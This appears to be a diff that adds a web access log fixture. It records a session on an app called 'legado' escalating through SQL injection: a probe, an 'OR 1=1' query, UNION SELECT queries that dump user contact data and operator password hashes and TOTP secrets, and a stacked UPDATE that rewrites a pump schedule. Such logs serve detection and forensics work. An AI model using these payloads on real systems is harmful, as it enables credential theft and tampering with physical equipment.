@@ -1,0 +1,7 @@
+{"ts": "2026-10-17T02:12:03.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "POST", "path": "/login", "query": ""}
+{"ts": "2026-10-17T02:12:03.000Z", "source": "web", "app": "legado", "event": "login_ok", "user": "coord1", "src": "203.0.113.77", "mfa": false}
+{"ts": "2026-10-17T02:12:40.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "GET", "path": "/historico", "query": "q=Matheus'+"}
+{"ts": "2026-10-17T02:13:02.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "GET", "path": "/historico", "query": "q=x%25'+OR+1%3D1+--"}
+{"ts": "2026-10-17T02:14:15.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "GET", "path": "/historico", "query": "q=zzz'+UNION+SELECT+id,email,phone,kind+FROM+users+--"}
+{"ts": "2026-10-17T02:15:09.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "GET", "path": "/historico", "query": "q=zzz'+UNION+SELECT+username,pw_hash,role,totp_secret+FROM+operators+--"}
+{"ts": "2026-10-17T02:16:30.000Z", "source": "web", "app": "legado", "src": "203.0.113.77", "method": "GET", "path": "/historico", "query": "q=x%25';+UPDATE+schedule+SET+start_h%3D0,+end_h%3D24+WHERE+pump%3D'bomba_escola';+--"}
